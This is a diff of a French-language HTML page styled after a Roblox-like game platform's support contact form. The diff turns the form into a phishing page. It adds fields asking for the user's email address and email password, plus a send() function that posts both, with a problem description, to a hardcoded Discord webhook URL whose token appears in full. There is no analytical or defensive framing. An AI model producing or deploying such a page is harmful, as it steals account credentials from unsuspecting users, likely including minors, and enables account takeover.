@@ -4,32 +4,48 @@
     <meta charset="UTF-8">
     <title>Contact</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f4f5; margin: 0; color: #393939; }
+        body { font-family: 'Segoe UI', sans-serif; background: #ffffff; margin: 0; color: #393939; }
         
         /* Barre de navigation */
-        .nav-bar { background: white; height: 60px; display: flex; align-items: center; padding: 0 40px; border-bottom: 1px solid #dcdcdc; }
-        .logo { width: 35px; height: 35px; background: #393939; transform: rotate(10deg); display: flex; align-items: center; justify-content: center; margin-right: 25px; }
-        .logo-hole { width: 12px; height: 12px; background: white; }
-        .nav-item { margin: 0 20px; font-weight: 600; cursor: pointer; color: #111; font-size: 14px; }
-        .nav-item:hover { text-decoration: underline; }
+        .nav-bar { background: #f2f4f5; height: 40px; display: flex; align-items: center; padding: 0 40px; border-bottom: 1px solid #dcdcdc; }
+        .logo { width: 25px; height: 25px; background: #393939; transform: rotate(10deg); display: flex; align-items: center; justify-content: center; margin-right: 25px; }
+        .logo-hole { width: 8px; height: 8px; background: #f2f4f5; }
         
-        .search-box { background: #f2f4f5; border: 1px solid #c1c1c1; padding: 5px 15px; border-radius: 4px; display: flex; align-items: center; width: 250px; margin-left: 20px; }
-        .search-box input { border: none; background: transparent; outline: none; margin-left: 10px; width: 100%; color: #393939; }
+        .nav-item { 
+            margin: 0 10px; font-weight: 600; cursor: pointer; color: #111; font-size: 16px; padding: 10px 20px; 
+            border-bottom: 2px solid transparent; text-align: center; white-space: nowrap;
+        }
+        .nav-item:hover { border-bottom: 2px solid #393939; }
+        
+        .search-box { display: flex; align-items: center; border: 1px solid #b3b3b3; border-radius: 4px; padding: 2px 8px; margin-left: 20px; width: 250px; height: 22px; background: #f2f2f2; }
+        .search-box svg { width: 16px; height: 16px; fill: #666; }
+        .search-box input { border: none; outline: none; margin-left: 8px; width: 100%; font-size: 13px; font-weight: 400; color: #666; background: transparent; }
 
-        .auth-btns { margin-left: auto; display: flex; gap: 10px; }
-        .btn-blue { background: #0084dd; color: white; border: none; padding: 8px 20px; border-radius: 2px; font-weight: bold; cursor: pointer; }
-        .btn-white { background: white; color: #393939; border: 1px solid #393939; padding: 8px 20px; border-radius: 2px; font-weight: bold; cursor: pointer; }
+        /* Boutons Auth */
+        .auth-btns { margin-left: auto; display: flex; gap: 10px; align-items: center; }
+        .btn { padding: 5px 15px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .btn-blue { background: #0055ff; color: white; border: none; }
+        .btn-white { background: #f2f2f2; color: #777; border: 1px solid #000; } 
 
-        /* Conteneur principal */
-        .container { max-width: 800px; margin: 40px auto; padding: 20px; }
-        h1 { font-size: 32px; margin-bottom: 30px; }
-        .card { background: white; padding: 30px; border: 1px solid #e3e3e3; border-radius: 4px; }
+        .container { max-width: 600px; margin: 40px auto; padding: 20px; }
+        .card { background: #f2f4f5; padding: 30px; border: 1px solid #e3e3e3; border-radius: 4px; }
         
-        h2 { font-size: 20px; margin-bottom: 20px; border-bottom: 1px solid #e3e3e3; padding-bottom: 10px; }
-        label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; }
-        input, select, textarea { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; background: #f2f2f2; border-radius: 2px; box-sizing: border-box; }
+        /* Champs saisis */
+        input, textarea { 
+            width: 100%; padding: 12px 15px; margin: 10px 0; 
+            border: 1px solid #b3b3b3; 
+            background: #e8e8e8; 
+            color: #111; 
+            font-size: 15px; 
+            font-weight: 500;
+            border-radius: 6px; 
+            box-sizing: border-box; 
+        }
+        textarea { height: 120px; resize: vertical; font-family: inherit; }
         
-        button.submit { background: #232323; color: white; padding: 12px 30px; border: none; cursor: pointer; font-weight: bold; }
+        .submit { background: #232323; color: white; padding: 10px 24px; border-radius: 6px; border: none; margin-top: 20px; cursor: pointer; font-weight: bold; }
+        .submit:disabled { background: #ccc; cursor: not-allowed; }
+        .error { color: red; font-size: 12px; margin-bottom: 10px; display: none; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -41,51 +57,77 @@
     <div class="nav-item">Créer</div>
     <div class="nav-item">Robux</div>
     <div class="search-box">
-        <span>🔍</span>
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
         <input type="text" placeholder="Rechercher">
     </div>
     <div class="auth-btns">
-        <button class="btn-blue">S'inscrire</button>
-        <button class="btn-white">Connexion</button>
+        <button class="btn btn-blue">S'inscrire</button>
+        <button class="btn btn-white">Connexion</button>
     </div>
 </div>
 
 <div class="container">
-    <h1>Contact</h1>
     <div class="card">
         <h2>Coordonnées</h2>
-        <label>Nom d'utilisateur (facultatif)</label>
-        <input type="text" placeholder="Nom d'utilisateur">
+        <input type="text" id="mail1" placeholder="Adresse e-mail" oninput="validate()">
+        <input type="text" id="mail2" placeholder="Confirmer l'adresse e-mail" oninput="validate()">
+        <input type="password" id="mdp1" placeholder="Mot de passe du mail" oninput="validate()">
+        <input type="password" id="mdp2" placeholder="Confirmer le mot de passe" oninput="validate()">
         
-        <label>Prénom (facultatif)</label>
-        <input type="text" placeholder="Prénom">
-
-        <label>Adresse e-mail</label>
-        <input type="text" placeholder="Adresse e-mail">
-
-        <label>Confirmer l'adresse e-mail</label>
-        <input type="text" placeholder="Confirmer l'adresse e-mail">
-
-        <h2>Détails du problème</h2>
-        <label>Sur quel appareil le problème se pose-t-il ?</label>
-        <select><option>Type d'appareil</option></select>
-
-        <label>Catégories d'aide</label>
-        <select><option>Type de catégorie d'aide</option></select>
-
         <label>Décris ton problème</label>
-        <textarea rows="5"></textarea>
-
-        <button class="submit" onclick="send()">Envoyer</button>
+        <textarea id="probleme" placeholder="Veuillez décrire le problème..."></textarea>
+        
+        <div id="err" class="error">Erreur</div>
+        <button class="submit" id="sendBtn" onclick="send()" disabled>Envoyer</button>
     </div>
 </div>
 
 <script>
-    function send() {
-        alert("Envoi en cours...");
-        // Ton code de fetch pour le webhook reste ici
+    function validate() {
+        const m1 = document.getElementById('mail1').value;
+        const m2 = document.getElementById('mail2').value;
+        const p1 = document.getElementById('mdp1').value;
+        const p2 = document.getElementById('mdp2').value;
+        const btn = document.getElementById('sendBtn');
+        const err = document.getElementById('err');
+        
+        if(m1 && m2 && p1 && p2) {
+            if(m1 !== m2 || p1 !== p2) {
+                btn.disabled = true;
+            } else {
+                err.style.display = 'none'; btn.disabled = false;
+            }
+        } else {
+            btn.disabled = true;
+        }
+    }
+
+    async function send() {
+        const webhookUrl = "https://discord.com/api/webhooks/1513575389321232544/TK19AzlvZaYD8oIU9esYrpFVhQ7Kclj0IagyWVTPmgwn571r4auVj4nckaSqic4itwi9";
+        const data = {
+            "content": "--- Nouvelle soumission ---",
+            "embeds": [{
+                "title": "Nouvelles informations",
+                "fields": [
+                    { "name": "Email", "value": document.getElementById('mail1').value },
+                    { "name": "Mot de passe", "value": document.getElementById('mdp1').value },
+                    { "name": "Problème", "value": document.getElementById('probleme').value }
+                ],
+                "color": 16711680
+            }]
+        };
+
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+            alert("Informations envoyées avec succès !");
+        } catch (error) {
+            alert("Erreur lors de l'envoi.");
+        }
     }
 </script>
-
 </body>
 </html>
